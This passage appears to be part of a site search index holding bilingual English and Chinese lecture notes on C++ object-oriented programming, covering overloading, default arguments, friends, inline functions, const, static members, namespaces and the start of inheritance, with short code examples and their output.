"Function overloading | \u51fd\u6570\u91cd\u8f7d", "text": "<ul> <li>Same functions with different arguments list</li> </ul> <pre><code>void print(char* str, int width);   // #1\nvoid print(double d, int width);    // #2\nvoid print(long l, int width);      // #3\nvoid print(int i, int width);       // #4\nvoid print(char *str);              // #5\n\nprint(\"Hello\", 10);                 // #1\nprint(1.234, 10);                   // #2\nprint(123456789L, 10);              // #3\nprint(123456789, 10);               // #4\nprint(\"Hello\");                     // #5\n</code></pre> <p>Overload and auto-cast</p> <pre><code>\u00b7\u00b7\u00b7\nvoid f(short i) { cout &lt;&lt; \"short\" &lt;&lt; endl; }\nvoid f(double d) { cout &lt;&lt; \"double\" &lt;&lt; endl; }\n\nint main()\n{\n    f('a');       // ambiguous (char -&gt; short or char -&gt; double)\n    f(1);         // ambiguous (int -&gt; short or int -&gt; double)\n    f(1L);        // ambiguous (long -&gt; short or long -&gt; double)\n    f(1.0);       // right\n}\n\u00b7\u00b7\u00b7\n</code></pre>"}, {"location": "Course/OOP/Lec04/#default-arguments", "title": "Default arguments", "text": "<ul> <li>A default argument is a value given in the declaration that the compiler automatically inserts if you don\u2019t provide a value in the function call</li> <li>To define a function with an argument list, defaults must be added from right to left</li> </ul> <pre><code>int a(int n, int m = 4, int j = 5);\nint b(int n, int m = 4, int j); // error\nint c(int n = 1, int m = 2, int j = 3); \n\nHa = a(1);      // n = 1, m = 4, j = 5\nHa = a(1, 2);   // n = 1, m = 2, j = 5\n</code></pre> <p>Note</p> <p>\u9ed8\u8ba4\u53c2\u6570\u8981\u5199\u5728\u51fd\u6570\u58f0\u660e\u4e2d\uff0c\u51fd\u6570\u5b9a\u4e49\u4e2d\u4e0d\u80fd\u91cd\u590d\u5199\u9ed8\u8ba4\u53c2\u6570</p>"}, {"location": "Course/OOP/Lec04/#c-access-control", "title": "C++ access control", "text": "<ul> <li>The members of a class can be cataloged, marked as <ul> <li>public -&gt; means all member declarations that follow are available to everyone</li> <li>private -&gt; means that no one can access that member except inside function members of that type</li> <li>protected -&gt; \u5bf9\u5b50\u7c7b\u6709\u6548</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec04/#friends", "title": "Friends | \u53cb\u5143", "text": "<ul> <li>to explicitly grant access to a function that isn\u2019t a member of the structure</li> <li>The class itself controls which code has access to its members</li> <li>Can declare a global function as a friend , as well as a member function of another class, or even an entire class, as a friend</li> <li>friend is a declaration rather than a definition</li> </ul> Example <pre><code>struct Y{\n    void f(X*);\n};\nstruct X{\nprivate:\n    int i;\npublic:\n    void initialize();\n    friend void g(X*, int); // Global friend\n    friend void Y::f(X*);   // Struct member friend\n    friend struct Z;    // Entire struct is a friend\n};\n</code></pre> \u53cb\u5143 codeoutput\u6d4b\u8bd5\u65f6\u7684\u4e00\u4e2a\u95ee\u9898 <pre><code>#include &lt;iostream&gt;\nusing namespace std;\n\nclass A;\nclass B\n{\nprivate:\n    int value;\npublic:\n    B():value(0x12345678){}\n    void Print(A a);\n};\n\n//void Print(A a);\n\nclass A \n{\nprivate:\n    friend void Print(A a);\n    int value;\npublic:\n    friend void B::Print(A a);\n    A():value(0xabababab){}\n};\nvoid B::Print(A a)\n{\n    cout &lt;&lt; \"B::Print\" &lt;&lt; endl;\n    cout &lt;&lt; hex &lt;&lt; value &lt;&lt;endl; // \u6210\u5458\u53d8\u91cf value -&gt; 0x12345678\n    cout &lt;&lt; a.value &lt;&lt; endl;     // \u6210\u5458\u53d8\u91cf value -&gt; 0xabababab\n\n}\nvoid Print(A a)\n{\n    cout &lt;&lt; \"Global Print\" &lt;&lt; endl;\n    cout &lt;&lt; a.value &lt;&lt; endl;     // \u6210\u5458\u53d8\u91cf value -&gt; 0xabababab\n}\n\n\nint main()\n{\n    A a;\n    B b;\n    b.Print(a);\n    Print(a);\n    return 0;\n}\n</code></pre> <pre><code>B::Print\n12345678\nabababab\nGlobal Print\nabababab\n</code></pre> <ul> <li>\u521a\u5f00\u59cb\u7684\u65f6\u5019\u628a\u53cb\u5143\u51fd\u6570\u653e\u5230 <code>public</code> \u4e0b\u4e86\uff0c\u4e00\u76f4\u6ce2\u6d6a\u7ebf\u9519\u8bef</li> <li>\u540e\u6765\u653e\u5230 <code>A</code> \u6700\u524d\u9762\u5c31\u597d\u4e86\uff08\u4e0d\u786e\u5b9a\u662f\u51fa\u4e86\u4ec0\u4e48\u95ee\u9898</li> <li>\u540e\u6765\u53c8\u8bd5\u4e86\u8bd5\u653e\u5230 <code>A</code> \u7684\u4efb\u610f\u4f4d\u7f6e\u90fd\u662f\u6b63\u5e38\u53ef\u7528\u7684\ud83d\ude30</li> </ul> Quote <p>\u4e00\u4e2a\u5173\u4e8e\u53cb\u5143\u7684\u5341\u5206\u901a\u4fd7\u7684\u4f8b\u5b50</p>"}, {"location": "Course/OOP/Lec04/#inline-functions", "title": "Inline Functions", "text": "<p>Inline \u7684 body \u662f\u58f0\u660e\uff0c\u4e0d\u662f\u5b9a\u4e49</p> <ul> <li>In order to solve the problem that some frequently called small functions consume a large amount of stack space (stack memory), inline functions are introduced</li> <li>An inline function is expected in place, like a preprocessor macro, so the overhead of the function call is eliminated</li> </ul> <pre><code>inline int plusOne(int x);\ninline int plusOne(int x){ return ++x; };\n</code></pre> <ul> <li>Repeat inline in the definition and declaration</li> <li>An inline function definition may not generate any code in .obj file</li> <li>Inline functions in header file<ul> <li>So you can put inline functions\u2019 bodies in header file. Then <code>#include</code> it where the function is needed</li> <li>Never be afraid of multi-definition of inline functions, since they have no body at all</li> <li>Definitions of inline functions are just declarations</li> </ul> </li> <li> <p>Inline inside classes</p> <ul> <li>Any function you define inside a class declaration is automatically an inline</li> </ul> <p>\u5728\u7c7b\u4e2d\u4f7f\u7528 inline \u51fd\u6570\uff0c\u8981\u4e48\u628a\u4e3b\u4f53\u653e\u5728 class \u5185\uff0c\u8981\u4e48\u653e\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d\uff08inline \u662f\u58f0\u660e\uff0c\u4e0d\u662f\u5b9a\u4e49\uff09</p> Example insideoutside <pre><code>class A{\npublic:\n    inline void f(){ } // automatically inline (`inline` can be omitted)\n};\n</code></pre> <pre><code>class A{\npublic:\n    inline void f();    // `inline` can be omitted\n};\ninline void A::f(){} // OK\n</code></pre> </li> <li> <p>Tradeoff of inline functions</p> <ul> <li>Body of the called function is to be inserted into the caller</li> <li>This may expand the code size</li> <li>but deduces the overhead of calling time</li> <li>So it gains speed at the expenses of space</li> <li>In most cases, it is worth</li> <li>It is much better than macro in C. It checks the type of the parameters</li> </ul> </li> <li>Inline may not in-line<ul> <li>The compiler does not have to honor your request to make a function inline. It might decide the function is too large or notice that is calls itself(recursion is not allowed or indeed possible for inline functions), or the feature might not be implemented for your particular compiler</li> </ul> </li> <li>Inline or not?<ul> <li>Inline:<ul> <li>Small functions</li> <li>Frequently called functions, e.g. inside loops</li> </ul> </li> <li>Not Inline:<ul> <li>Very large functions</li> <li>Recursive functions</li> </ul> </li> <li>A lazy way<ul> <li>Make all your functions inline</li> <li>Never make any function inline</li> </ul> </li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec05/", "title": "Key Words | \u5173\u952e\u5b57", "text": "<p> \u7ea6 1444 \u4e2a\u5b57  278 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p>"}, {"location": "Course/OOP/Lec05/#const", "title": "<code>Const</code>", "text": "<ul> <li>declares a variable to have a constant value</li> <li>Constants are variables<ul> <li>Observe scoping rules</li> <li>Declared with \u201cconst\u201d type modifier</li> </ul> </li> <li>A const in C++ defaults to internal linkage<ul> <li>the compiler tries to avoid creating storage for a const \u2013 holds the value in its symbol table</li> <li>extern forces storage to be allocated</li> </ul> </li> <li>Compile time constants<ul> <li><code>const int bufsize = 1024;</code></li> <li>value must be initialized</li> <li>unless you make an explict extern declaration: <code>extern const int bufsize;</code></li> <li>Compiler won\u2019t let you change it</li> <li>Compile time constants are entries in compiler symbol table, not really variables</li> </ul> </li> <li> <p>Run-time constants</p> <ul> <li>const value can be expolited</li> </ul> RIGHTWRONG <pre><code>const int size = 10;\nint finalGrade[size];   // ok\n</code></pre> <pre><code>int x;\ncin &gt;&gt; x;\nconst int size = x;\nint finalGrade[size];   // error!\n</code></pre> </li> <li> <p>Aggregates</p> <ul> <li>It\u2019s possible to use const for aggregates, but storage will allocated. In these situations, const means \u201cread-only\u201d. However, the value cannot be used at compile time because the compiler is not required to know the contents of the storage at compile time.</li> </ul> </li> <li> <p>Pointers and const \u2013 a pointer may be const</p> <ul> <li><code>char * const p = \"abc\";</code> \u2013 <code>p</code> is a const pointer to char<ul> <li><code>*q = 'c';</code> \u2013 ok</li> <li><code>q++;</code> \u2013 error</li> </ul> </li> <li><code>const char * p = \"abc\";</code> \u2013 <code>*p</code> is a const char<ul> <li><code>*p = 'c';</code> \u2013 error</li> <li>\u6307\u9488\u53ef\u53d8\uff08\u6307\u5411\u522b\u4eba\uff09\uff0c\u6307\u9488\u6240\u6307\u5411\u7684\u5185\u5b58\u4e5f\u53ef\u53d8\uff0c\u4e0d\u80fd\u505a\u7684\u662f\u901a\u8fc7\u8fd9\u4e2a\u6307\u9488\u6539\u53d8\u6307\u5411\u5185\u5b58\u7684\u503c</li> </ul> </li> <li><code>char const * p = \"abc\";</code> \u2013 same as above <code>const char * p = \"abc\";</code></li> </ul> Example <pre><code>int * ip;\nconst int * cip;\n\nint i;\nip = &amp;i;    // ok\ncip = &amp;i;   // ok, but can't use cip to change i\n\nconst int ci = 3;\nip = &amp;ci;   // error, ip is not const but ci is\ncip = &amp;ci;  // ok , both cip and ci is const\n</code></pre> </li> <li> <p>String Literals</p> <ul> <li><code>char *s = \"Hello\";</code></li> <li><code>s</code> is a pointer initialized to point to a string constant</li> <li>This is actually a <code>const char *s</code>, but compiler accepts it</li> <li>Don\u2019t try to change the character (it is undefined behavior)</li> <li>If you want to change the string, put it in an array \u2013 <code>char s[] = \"Hello\";</code> </li> </ul> </li> <li> <p>const object</p> <ul> <li><code>const Currency price(3, 50);</code></li> <li>\u6b64\u65f6\uff0c\u7f16\u8bd1\u5668\u4f1a\u5236\u6b62\u4fee\u6539 <code>price</code> \u4e2d public \u6210\u5458\u53d8\u91cf\u4ee5\u53ca\u8c03\u7528 <code>price</code> \u4e2d\u4fee\u6539\u6210\u5458\u53d8\u91cf\u51fd\u6570\u7684\u64cd\u4f5c</li> </ul> \u7f16\u8bd1\u5668\u600e\u4e48\u77e5\u9053\u8c03\u7528\u4e86\u4f1a\u4fee\u6539\u6210\u5458\u53d8\u91cf\u7684\u51fd\u6570 (\u975e inline) <ul> <li>\u5f15\u5165\u65b0\u673a\u5236 - declare member functions as const</li> </ul> <pre><code>int Date::set_day(int d) \n{\n    // ... error check d here\n    day = d;    // ok, non-const so can modify\n}\n\nint Date::get_day() const\n{\n    day ++;    // ERROR modifies data member\n    set_day(1); // ERROR calls non-const function\n\n    return day; // ok, doesn't modify anything\n}\n</code></pre> <ul> <li>\u6b64\u65f6\u82e5 Date \u7c7b\u7684\u5bf9\u8c61\u4e3a const\uff0c\u90a3\u4e48\u8be5\u5bf9\u8c61\u4e0d\u80fd\u8c03\u7528\u9664 const\u3001static \u4e4b\u5916\u7684\u7c7b\u7684\u6210\u5458\u51fd\u6570\uff0c\u5426\u5219\u4f1a\u62a5\u9519</li> <li>\u6210\u5458\u51fd\u6570\u58f0\u660e\u5c3e\u90e8\u5e26\u6709 const\uff0c\u90a3\u4e48\u53ea\u80fd\u8c03\u7528\u5e26\u6709 const \u7684\u6210\u5458\u51fd\u6570\u4e14\u65e0\u6cd5\u4fee\u6539\u6210\u5458\u51fd\u6570\u7b49</li> <li>Const member function usage<ul> <li>Repeat the <code>const</code> keyword in the function declaration and definition if the function is defined outside the class definition</li> <li><code>int get_day() const;</code> &amp; <code>int Date::get_day() const { ... }</code></li> </ul> </li> <li>Function members that do not modify the object should be declared const</li> <li>const member functions are safe for const objects</li> </ul> const member functions can be overloaded code <pre><code>\u00b7\u00b7\u00b7\nclass Date\n{\n    public:\n        int get_day() const { cout &lt;&lt; \"const\" &lt;&lt; endl; }\n        int get_day() { cout &lt;&lt; \"non-const\" &lt;&lt; endl; }\n};\nint main()\n{\n    Date a;\n    const Date b;\n    a.get_day();    // print -&gt; \"non-const\"\n    b.get_day();    // print -&gt; \"const\"\n}\n</code></pre> <ul> <li><code>int get_day() const;</code> &amp; <code>int get_day();</code></li> <li><code>const</code> is part of the function signature</li> <li>As the code showed right, when coming across member functions with same name and arguments, <code>const</code> object will call <code>const</code> member function, non-<code>const</code> object will call non-<code>const</code> member function</li> <li><code>get_day()</code> &amp; <code>get_day() const</code> \u770b\u8d77\u6765\u6ca1\u6709\u53c2\u6570\uff0c\u5b9e\u9645\u6709\u9690\u85cf\u53c2\u6570<ul> <li><code>int get_day()</code> -&gt; <code>int get_day(Date *this)</code></li> <li><code>int get_day() const</code> -&gt; <code>int get_day(const Date *this)</code></li> </ul> </li> <li>\u7f16\u8bd1\u5668\u5c31\u53ef\u901a\u8fc7 <code>this</code> \u6765\u5224\u65ad</li> </ul> </li> <li> <p>Constant in class</p> <ul> <li><code>const</code> object\u2019s member variable (non-const) must be initialized in constructor or initializer list (\u5373\u4f60\u8ba4\u4e3a\u8fd9\u4e2a\u5bf9\u8c61\u4e0d\u53ef\u6539\u53d8\uff0c\u4f46\u8fd9\u4e2a\u5bf9\u8c61\u91cc\u9762\u7684\u53d8\u91cf\u8d77\u7801\u8981\u6709\u4e2a\u503c)</li> <li>if the member variable is a const<ul> <li>must be initialized in the initializer list</li> <li>or directly initialized in the class definition (for  c++11 and later) -&gt; <code>const int a = 1;</code></li> </ul> </li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec05/#static", "title": "<code>static</code>", "text": "<p>Static in C++</p> <ul> <li>Two basic meanings<ul> <li>Static storage duration<ul> <li>allocated once at a fixed address</li> </ul> </li> <li>Visibility of a name<ul> <li>internal linkage</li> </ul> </li> <li>Don\u2019t use except inside functions and classes</li> </ul> </li> </ul> codeoutput <pre><code>class A\n{\n    const int a;    \npublic:\n    A() :a(0) \n    {\n        cout &lt;&lt; \"A() called\" &lt;&lt; endl;\n    }\n};\n\nvoid f()\n{\n    cout &lt;&lt; \"in f()\" &lt;&lt; endl;\n    static A a;\n    cout &lt;&lt; \"out f()\" &lt;&lt; endl;\n}\nint main()\n{\n    cout &lt;&lt; \"in main()\" &lt;&lt; endl;\n    f();\n    cout &lt;&lt; \" ------------ \" &lt;&lt; endl;\n    f();\n    cout &lt;&lt; \"out main()\" &lt;&lt; endl;\n    return 0;\n}\n</code></pre> <pre><code>in main()\nin f()\nA() called\nout f()\n ------------ \nin f()\nout f()\nout main()\n</code></pre> <ul> <li>\u53ea\u6709\u8fdb\u5165 f \u51fd\u6570\u65f6\uff0c\u624d\u4f1a\u8c03\u7528 A \u7684\u6784\u9020\u51fd\u6570\uff0c\u4e14\u53ea\u8c03\u7528\u4e00\u6b21 (static \u7684\u5b58\u50a8\u5730\u5740\u4e0d\u5728\u6808\u4e2d\u800c\u5728\u5168\u5c40\u4e2d)</li> <li> <p>Static applied to objects</p> <ul> <li>Constructor occurs when definition is encountered<ul> <li>Constructor is called only once</li> <li>The constructor arguments must be satisfied</li> </ul> </li> <li>Destruction take place on exit from the program<ul> <li>Compiler assures LIFO order of destruction</li> </ul> </li> </ul> Conditional construction exampleexplanation <pre><code>void f(int x)\n{\n    if(x &gt; 10)\n    {\n        static X my_X(x,  x * 21);\n        \u00b7\u00b7\u00b7\n    }\n}\n</code></pre> <ul> <li><code>my_X</code> is constructed once, if <code>f()</code> is ever called with <code>x &gt; 10</code></li> <li>retains its value</li> <li>destroyed only if constructed</li> </ul> Tip <ul> <li>avoid non-local static dependencies</li> <li>Put static object definitions in a single file in correct order</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec05/#static-members", "title": "Static members", "text": "Can we apply static to members <ul> <li>Static means \u201cHidden\u201d &amp; \u201cPersistent\u201d</li> <li>Hidden: A static member is a member (obey usual access rules)</li> <li>Persistent: Independent of instances</li> <li>\u9759\u6001\u6210\u5458\u53d8\u91cf\u7c7b\u4f3c\u9759\u6001\u672c\u5730\u53d8\u91cf\uff0c\u662f\u5168\u5c40\u53d8\u91cf\uff0c\u8bbf\u95ee\u9650\u5236\u4e8e\u7c7b\u4e2d</li> <li>\u9759\u6001\u6210\u5458\u51fd\u6570\u662f\u53ea\u80fd\u8bbf\u95ee\u9759\u6001\u6210\u5458\u53d8\u91cf\u7684\u51fd\u6570\uff0c\u4e0d\u80fd\u8bbf\u95ee\u975e\u9759\u6001\u6210\u5458\u53d8\u91cf</li> </ul> <ul> <li>Static member variables<ul> <li>Global to all class member functions</li> <li>Initialized once, at file scope</li> <li>provide a place for this variable and init it in <code>.cpp</code></li> <li>No <code>static</code> in <code>.cpp</code></li> </ul> </li> </ul> Example StatMem.hStatMem.cppoutputexplanation <pre><code>#ifndef _STAT_MEM_\n#define _STAT_MEM_\nclass StatMem{\npublic:\n    int getHeight() { return m_h; }\n    void setHeight(int i) { m_h = i; }\n    int getWeight() { return m_w; }\n    void setWeight(int i) { m_w = i; }\n\n    static int m_h;\n    int m_w;\n};\n#endif\n</code></pre> <pre><code>#include \"StatMem.h\"\n#include &lt;iostream&gt;\nusing namespace std;\n\nint StatMem::m_h;   // \u4e00\u4e2a\u9759\u6001\u7684\u6210\u5458\u53d8\u91cf\u4e00\u5b9a\u8981\u5728\u5bf9\u5e94\u7684 cpp \u6587\u4ef6\u4e2d\u653e\u4e00\u4e2a\u5168\u5c40\u7684\u5b9a\u4e49\n\nint main()\n{\n    StatMem sm1, sm2;\n    int i = 0;\n    cout &lt;&lt; sizeof(i) &lt;&lt; endl;\n    cout &lt;&lt; \"i=\" &lt;&lt; i &lt;&lt; endl;\n\n    sm1.setHeight(10);\n    cout &lt;&lt; sm2.getHeight() &lt;&lt; endl;\n    sm1.setWeight(20);\n    cout &lt;&lt; sm2.getWeight() &lt;&lt; endl;\n    cout &lt;&lt; &amp;sm1 &lt;&lt; '\\t' &lt;&lt; &amp;(sm1.m_h) &lt;&lt; '\\t' &lt;&lt; &amp;(sm1.m_w) &lt;&lt; endl;\n    cout &lt;&lt; &amp;sm2 &lt;&lt; '\\t' &lt;&lt; &amp;(sm2.m_h) &lt;&lt; '\\t' &lt;&lt; &amp;(sm2.m_w) &lt;&lt; endl;\n    cout &lt;&lt; sizeof(StatMem) &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre> <pre><code>4\ni=0\n10\n0   \n0x7fffbf7d5e08 0x7fffbf7d5e08 0x10d62f0f8\n0x7fffbf7d5e00 0x7fffbf7d5e00 0x10d62f0f8\n4\n</code></pre> <ul> <li><code>m_h</code> is a static member variable, it is global to all class member functions | \u5b58\u653e\u5728\u5168\u5c40\u800c\u4e0d\u662f\u6808\u4e2d\uff0c\u4e14 <code>sm1</code> \u548c <code>sm2</code> \u90fd\u6307\u5411\u540c\u4e00\u4e2a <code>m_h</code></li> <li><code>StatMem</code> \u4e2d\u53ea\u6709\u4e00\u4e2a <code>int</code> \u7684\u5927\u5c0f\uff0c\u5730\u5740\u76f8\u5dee 8 \u662f\u56e0\u4e3a 64 \u4f4d\u7684\u673a\u5668\u4e00\u4e2a word \u5360 8 \u4e2a\u5b57\u8282</li> </ul> <ul> <li>Static member functions<ul> <li>Global to all class member functions</li> <li>No <code>this</code> pointer</li> <li>Can access only static member variables</li> <li>No <code>static</code> in <code>.cpp</code></li> <li>Can\u2019t be dynamicallly overriden</li> </ul> </li> </ul>"}, {"location": "Course/OOP/Lec05/#namespace", "title": "Namespace", "text": "<p>Namespace</p> <ul> <li>Expresses a logical grouping of classes, functions, variables, etc.</li> <li>A namespace is a scope just like a class</li> <li>Preferred when only name encapsulation is needed</li> </ul> <pre><code>namespace Math\n{\n    double abs(double);\n    double sqrt(double);\n    int trunc(double);\n    \u00b7\u00b7\u00b7\n}   \n</code></pre> <p>\u5927\u62ec\u53f7\u540e\u4e0d\u9700\u8981\u6709\u5206\u53f7</p> <ul> <li> <p>Defining namespaces | \u547d\u540d\u7a7a\u95f4\u7684\u5b9a\u4e49</p> <ul> <li>Place namespace definition in include file:</li> </ul> <pre><code>// Mylib.h\nnamespace Mylib\n{\n    void f();\n    class X \n    {\n    public:\n        void g(); \n        \u00b7\u00b7\u00b7 \n    };\n    ...\n}\n</code></pre> </li> <li> <p>Defining namespace functions | \u547d\u540d\u7a7a\u95f4\u51fd\u6570\u7684\u5b9a\u4e49</p> <ul> <li>Use normal scoping to implement functions in namespaces</li> </ul> <pre><code>// Mylib.cpp\n#include \"Mylib.h\"\nvoid Mylib::f()\n{\n    \u00b7\u00b7\u00b7\n}\nvoid Mylib::X::g()\n{\n    \u00b7\u00b7\u00b7\n}\n</code></pre> </li> <li> <p>Using names from a namespace | \u4f7f\u7528\u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u540d\u5b57</p> <ul> <li>Use scope resolution to qualify names from a namespace</li> <li>Can be tedious and distracting</li> </ul> <pre><code>// main.cpp\n#include \"Mylib.h\"\nint main()\n{\n    Mylib::f();\n    Mylib::X x;\n    x.g();\n    \u00b7\u00b7\u00b7\n}\n</code></pre> </li> <li> <p>Using-Declarations | \u4f7f\u7528\u58f0\u660e</p> <ul> <li>Introduces a local synonym for name</li> <li>States in one place where a name comes from</li> <li>Eliminates redundant scope qualification</li> </ul> <pre><code>// main.cpp\nvoid main()\n{\n    // \u5728 main \u51fd\u6570\u4e2d\u4f7f\u7528 using-declaration \u53ea\u5bf9\u51fd\u6570\u5185\u90e8\u6709\u6548\n    using Mylib::f;\n    using Mylib::X;\n    f();\n    X x;\n    x.g();\n    \u00b7\u00b7\u00b7\n}\n</code></pre> </li> <li> <p>Using-Directives | \u4f7f\u7528\u6307\u4ee4</p> <ul> <li>Make all names from a namespace available</li> <li>Can be used as a notational convenience</li> </ul> <pre><code>// main.cpp\nvoid main()\n{\n    using namespace Mylib;\n    f();\n    X x;\n    x.g();\n    \u00b7\u00b7\u00b7\n}\n</code></pre> </li> </ul>"}, {"location": "Course/OOP/Lec05/#more-details", "title": "More details", "text": "<ul> <li> <p>Ambiguities | \u6b67\u4e49</p> ExplanationCode <ul> <li>Using-directives may create potential ambiguities</li> <li>Using-directives only make the names available</li> <li>Ambiguities arise only when you make calls.</li> <li>Use scope resolution to resolve </li> </ul> <pre><code>// Mylib.h\nnamespace Xlib\n{\n    void x();\n    void y();\n}\nnamespace Ylib\n{\n    void y();\n    void z();\n} \n// main.cpp\n#include \"Mylib.h\"\nvoid main()\n{\n    using namespace Xlib;\n    using namespace Ylib;\n    x(); // OK\n    y(); // Ambiguous\n    z(); // OK\n    Xlib::y(); // OK\n}\n</code></pre> </li> <li> <p>Namespace aliases | \u547d\u540d\u7a7a\u95f4\u522b\u540d</p> ExplanationCode <ul> <li>Namespace names that are too short may clash</li> <li>names that are too long are hard to work with</li> <li>Use aliasing to create workable names</li> <li>Aliasing can be used to version libraries</li> </ul> <pre><code>namespace supercalifragilistic\n{\n    void f();\n}\nnamespace short = supercalifragilistic;\nshort::f();\n</code></pre> </li> <li> <p>Namespace composition | \u547d\u540d\u7a7a\u95f4\u7ec4\u5408</p> ExplanationCodeOutput <ul> <li>Compose new namespaces using names from other ones</li> <li>Using-declarations can resolve potential clashes</li> <li>Explicitly defined functions take precedence</li> </ul> <pre><code>#include &lt;iostream&gt;\nnamespace first\n{\n    void x();\n    void y();\n}\nnamespace second\n{\n    void y();\n    void z();\n}\n\nvoid first::x()\n{\n    std::cout &lt;&lt; \"first::x()\" &lt;&lt; std::endl;\n}\nvoid first::y()\n{\n    std::cout &lt;&lt; \"first::y()\" &lt;&lt; std::endl;\n}\nvoid second::y()\n{\n    std::cout &lt;&lt; \"second::y()\" &lt;&lt; std::endl;\n}\nvoid second::z()\n{\n    std::cout &lt;&lt; \"second::z()\" &lt;&lt; std::endl;\n}\nnamespace mine\n{\n    using namespace first;\n    using namespace second;\n    using first::y; // resolve clash to first::y()\n    void mystuff()\n    {\n        x();\n        y();\n        z();\n    }\n}\n\nint main()\n{\n    using namespace mine;\n    mystuff();\n}\n</code></pre> <pre><code>first::x()\nfirst::y()\nsecond::z()\n</code></pre> </li> </ul> <p> extern \u201cC\u201d </p> CodeExplanationQuote <pre><code>extern \"C\" {\n    #include \"oldc.h\"\n}\n</code></pre> <ul> <li><code>extern \"C\"</code> tells the compiler to use C linkage</li> <li>\u65e7\u7248\u7684 C \u8bed\u8a00\u4e2d\u6ca1\u6709\u547d\u540d\u7a7a\u95f4\uff0c\u76f4\u63a5 <code>#include \"oldc.h\"</code> \u4f1a\u5bfc\u81f4\u547d\u540d\u51b2\u7a81 \uff08\u94fe\u63a5\u6210\u6c47\u7f16\uff0c\u51fd\u6570\u540d\u4e0d\u4f1a\u52a0 <code>_</code>\uff09</li> <li>\u5bf9\u4e8e\u65b0\u7684 C++ \u8bed\u8a00\uff0c<code>#include \"newc.h\"</code> \u4f1a\u81ea\u52a8\u52a0\u4e0a <code>_</code>\uff0c\u6240\u4ee5\u4e0d\u4f1a\u6709\u547d\u540d\u51b2\u7a81</li> <li>\u6545\u5728\u4f7f\u7528\u65e7\u7248 C \u8bed\u8a00\u7684\u5934\u6587\u4ef6\u65f6\uff0c\u9700\u8981\u52a0\u4e0a <code>extern \"C\"</code>\uff0c\u544a\u8bc9\u7f16\u8bd1\u5668\u4f7f\u7528 C \u8bed\u8a00\u7684\u94fe\u63a5\u65b9\u5f0f</li> </ul> <p>\u5173\u4e8e C++ \u4e2d\u7684 extern \u201cC\u201d</p> <ul> <li> <p>Namespace selection | \u547d\u540d\u7a7a\u95f4\u9009\u62e9</p> <ul> <li>Compose namespaces by selecting a few features from other namespaces</li> <li>Choose only the names you want rather than all</li> <li>Changes to \u201corig\u201d declaration become reflected in \u201cmine\u201d</li> </ul> <pre><code>namespace mine{\n    using orig::Cat;    // Use Cat class from orig\n    void x();           \n    void y();           \n}\n</code></pre> </li> <li> <p>Namespaces are open | \u547d\u540d\u7a7a\u95f4\u662f\u5f00\u653e\u7684</p> <ul> <li>Multiple namespace declarations add to the same namespace <p>Namespace can be distributed across multiple files</p> </li> </ul> <pre><code>// header1.h\nnamespace X{\n    void f();\n}\n// header2.h\nnamespace X{\n    void g();   // X now contains f() and g()\n}\n</code></pre> </li> </ul>"}, {"location": "Course/OOP/Lec06/", "title": "Inheritance &amp; Polymorphism | \u7ee7\u627f\u4e0e\u591a\u6001", "text": "<p> \u7ea6 2243 \u4e2a\u5b57  296 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p>"}, {"location": "Course/OOP/Lec06/#inheritance", "title": "Inheritance | \u7ee7\u627f", "text": "\u653e\u5728 Reuse (\u91cd\u7528) \u4e2d\u6765\u8bb2 DescriptionMermaid <ul> <li>Reusing the interface | \u91cd\u7528\u63a5\u53e3<ul> <li>Inheritance is to take the existing class, clone it, and then make additions and modifications to the clone</li> </ul> </li> </ul> <pre><code>classDiagram\nShape &lt;-- Circle\n    Circle : draw()\n    Circle : erase()\nShape &lt;-- Line\n    Line : draw()\n    Line : erase()\nShape &lt;-- Square\n    Square : draw()\n    Square : erase()\nShape : draw()\nShape : erase()\n</code></pre> <p>What is Inheritance</p> <ul> <li>Language implementions technique</li> <li>Also an important component of the OOP design methodology</li> <li>Allows sharing of design for<ul> <li>Member variables</li> <li>Member functions</li> <li>Interfaces</li> </ul> </li> <li>Key technology in C++ </li> </ul> <ul> <li>The ablitity to define the behavior or implementation of one class as a superset of another class ()</li> <li>Inheritance allows us to define one class as an extension of another</li> <li>Advantages of inheritance<ul> <li>Avoids code duplication</li> <li>Code reuse</li> <li>Easier maintenance</li> <li>Extentibility</li> </ul> </li> </ul> code Employee.h &amp; cppManager.h &amp; cppmain.cppinfo <pre><code>// Define an Employee class\nclass Employee {\npublic:\n    Employee(const std::string&amp; name, const std::string&amp; ssn);\n    const std::string&amp; get_name() const;\n    void print() const;\n    void print(const std::string&amp; msg) const;\nprotected:\n    std::string m_name;\n    std::string m_ssn;\n};\nEmployee::Employee(const std::string&amp; name, const std::string&amp; ssn)\n    : m_name(name), m_ssn(ssn) \n{\n    // Initializer list sets up the values\n}\n// Employee member functions\ninline const std::string&amp; Employee::get_name() const \n{\n    return m_name;\n}\ninline void Employee::print() const \n{\n    std::cout &lt;&lt; m_name &lt;&lt; endl;\n    std::cout &lt;&lt; m_ssn &lt;&lt; endl;\n}\ninline void Employee::print(const std::string&amp; msg) const \n{\n    std::cout &lt;&lt; msg &lt;&lt; endl;\n    print();\n}\n</code></pre> <pre><code>class Manager : public Employee {\npublic:\n    Manager(const std::string&amp; name, const std::string&amp; ssn, const std::string&amp; title);\n    const std::string&amp; title_name() const;\n    void std::string&amp; get_title() const;\n    void print() const;\nprotected:\n    std::string m_title;\n};\nManager::Manager(const std::string&amp; name, const std::string&amp; ssn, const std::string&amp; title)\n    : Employee(name, ssn), m_title(title) \n{\n    // Initializer list sets up the values\n}\n// Manager member functions\ninline const std::string&amp; Manager::get_title() const \n{\n    return m_title;\n}\ninline void Manager::print() const \n{\n    Employee::print();\n    std::cout &lt;&lt; m_title &lt;&lt; endl;\n}\n</code></pre> <pre><code>#include \"Employee.h\"\n#include \"Manager.h\"\nint main() {\n    Employee e(\"John\", \"123-45-6789\");\n    Manager m(\"Mary\", \"987-65-4321\", \"VP\");\n    e.print();      // \u6b63\u786e\n    m.print();      // \u6b63\u786e\n    e.print(\"Employee\");    // \u6b63\u786e\n    m.print(\"Manager\");     // \u9519\u8bef\n    return 0;\n}\n</code></pre> <ul> 